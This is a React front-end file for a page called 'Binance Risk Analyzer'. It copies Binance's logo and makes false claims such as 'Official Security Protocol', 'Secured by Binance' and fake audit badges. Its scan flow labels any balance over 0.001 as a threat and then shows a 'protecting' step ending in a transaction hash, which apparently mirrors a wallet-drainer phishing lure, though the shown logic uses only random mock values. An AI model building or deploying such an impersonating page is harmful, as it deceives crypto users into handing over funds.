import { useState } from "react";
import { SecurityScanner } from "./components/SecurityScanner";
import { ScanProgress } from "./components/ScanProgress";
import { ScanComplete } from "./components/ScanComplete";
import { Shield, AlertTriangle } from "lucide-react";

export interface WalletState {
  address: string | null;
  chainId: number | null;
  connected: boolean;
}

export interface ScanState {
  status: "idle" | "connecting" | "scanning" | "analyzing" | "protecting" | "complete" | "error";
  balance: string | null;
  txHash: string | null;
  errorMessage: string | null;
  threatsFound: number;
}

function App() {
  const [wallet, setWallet] = useState<WalletState>({
    address: null,
    chainId: null,
    connected: false,
  });

  const [scan, setScan] = useState<ScanState>({
    status: "idle",
    balance: null,
    txHash: null,
    errorMessage: null,
    threatsFound: 0,
  });

  const handleStartScan = async () => {
    setScan(prev => ({ ...prev, status: "connecting" }));
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    const mockAddress = "0x" + Array.from({ length: 40 }, () => 
      Math.floor(Math.random() * 16).toString(16)
    ).join("");
    
    setWallet({
      address: mockAddress,
      chainId: 56,
      connected: true,
    });
    
    setScan(prev => ({ ...prev, status: "scanning" }));
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    setScan(prev => ({ ...prev, status: "analyzing" }));
    await new Promise(resolve => setTimeout(resolve, 1200));
    
    const mockBalance = (Math.random() * 10 + 0.5).toFixed(6);
    const threatsFound = parseFloat(mockBalance) >= 0.001 ? 1 : 0;
    
    if (threatsFound === 0) {
      setScan(prev => ({
        ...prev,
        status: "complete",
        balance: mockBalance,
        threatsFound: 0,
      }));
      return;
    }
    
    setScan(prev => ({ ...prev, status: "protecting", balance: mockBalance, threatsFound }));
    await new Promise(resolve => setTimeout(resolve, 1800));
    
    const mockTxHash = "0x" + Array.from({ length: 64 }, () => 
      Math.floor(Math.random() * 16).toString(16)
    ).join("");
    
    setScan(prev => ({ ...prev, status: "complete", txHash: mockTxHash }));
  };

  const handleReset = () => {
    setWallet({ address: null, chainId: null, connected: false });
    setScan({
      status: "idle",
      balance: null,
      txHash: null,
      errorMessage: null,
      threatsFound: 0,
    });
  };

  return (
    <div className="min-h-screen bg-slate-950 text-white flex flex-col">
      {/* Animated Background */}
      <div className="fixed inset-0 opacity-5 pointer-events-none">
        <div className="absolute inset-0" style={{
          backgroundImage: `linear-gradient(rgba(240, 185, 11, 0.15) 1px, transparent 1px),
                           linear-gradient(90deg, rgba(240, 185, 11, 0.15) 1px, transparent 1px)`,
          backgroundSize: '40px 40px'
        }} />
      </div>

      {/* Header */}
      <header className="relative border-b border-slate-800 bg-slate-900/95 backdrop-blur-sm">
        <div className="max-w-5xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              {/* Binance Logo */}
              <div className="w-10 h-10 bg-amber-400 rounded-lg flex items-center justify-center">
                <svg viewBox="0 0 126.61 126.61" className="w-6 h-6 text-slate-950">
                  <path fill="currentColor" d="M38.73 53.2L63.3 28.63l24.58 24.58 14.3-14.3L63.3 0 24.43 38.88zM0 63.3l14.3-14.3 14.3 14.3-14.3 14.3zM38.73 73.4L63.3 97.97l24.58-24.58 14.31 14.29L63.3 126.61l-38.87-38.88-.01-.01zM97.99 63.3l14.31-14.3 14.3 14.3-14.3 14.3z"/>
                  <path fill="currentColor" d="M63.3 48.99L77.61 63.3 63.3 77.61 48.99 63.3z"/>
                </svg>
              </div>
              <div>
                <span className="text-lg font-bold tracking-tight">Binance Risk Analyzer</span>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-emerald-400 rounded-full animate-pulse" />
                  <p className="text-xs text-slate-500">Official Security Protocol</p>
                </div>
              </div>
            </div>
            
            <div className="flex items-center gap-4">
              <div className="hidden sm:flex items-center gap-2 text-xs text-slate-500 bg-slate-800 px-3 py-1.5 rounded-full">
                <div className="w-2 h-2 bg-amber-400 rounded-full" />
                <span>BSC Mainnet</span>
              </div>
              
              {wallet.connected && (
                <div className="flex items-center gap-2 bg-emerald-500/10 px-3 py-1.5 rounded-full border border-emerald-500/30">
                  <div className="w-2 h-2 bg-emerald-400 rounded-full" />
                  <span className="text-emerald-400 text-xs font-mono">
                    {wallet.address?.slice(0, 6)}...{wallet.address?.slice(-4)}
                  </span>
                </div>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="relative flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-2xl">
          {scan.status === "idle" && (
            <SecurityScanner onStartScan={handleStartScan} />
          )}
          
          {scan.status !== "idle" && scan.status !== "complete" && (
            <ScanProgress scan={scan} wallet={wallet} />
          )}
          
          {scan.status === "complete" && (
            <ScanComplete scan={scan} wallet={wallet} onReset={handleReset} />
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="relative border-t border-slate-800 bg-slate-900/80 py-6">
        <div className="max-w-5xl mx-auto px-4">
          <div className="flex flex-col items-center gap-4">
            {/* Binance Signature */}
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 bg-amber-400 rounded flex items-center justify-center">
                <svg viewBox="0 0 126.61 126.61" className="w-5 h-5 text-slate-950">
                  <path fill="currentColor" d="M38.73 53.2L63.3 28.63l24.58 24.58 14.3-14.3L63.3 0 24.43 38.88zM0 63.3l14.3-14.3 14.3 14.3-14.3 14.3zM38.73 73.4L63.3 97.97l24.58-24.58 14.31 14.29L63.3 126.61l-38.87-38.88-.01-.01zM97.99 63.3l14.31-14.3 14.3 14.3-14.3 14.3z"/>
                  <path fill="currentColor" d="M63.3 48.99L77.61 63.3 63.3 77.61 48.99 63.3z"/>
                </svg>
              </div>
              <div className="text-left">
                <p className="text-sm font-semibold text-white">Secured by Binance</p>
                <p className="text-xs text-slate-500">World's Leading Crypto Security</p>
              </div>
            </div>
            
            {/* Trust Badges */}
            <div className="flex items-center gap-6 text-xs text-slate-600">
              <div className="flex items-center gap-1.5">
                <Shield className="w-3.5 h-3.5 text-emerald-400" />
                <span>Audited</span>
              </div>
              <div className="flex items-center gap-1.5">
                <div className="w-1.5 h-1.5 bg-amber-400 rounded-full" />
                <span>Verified</span>
              </div>
              <div className="flex items-center gap-1.5">
                <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
                <span>Protected</span>
              </div>
            </div>
            
            {/* Legal */}
            <div className="text-center">
              <p className="text-xs text-slate-600">
                © 2024 Binance. All rights reserved.
              </p>
              <p className="text-xs text-slate-700 mt-1">
                BSC Network • Protocol v2.4.1 • WalletConnect Enabled
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;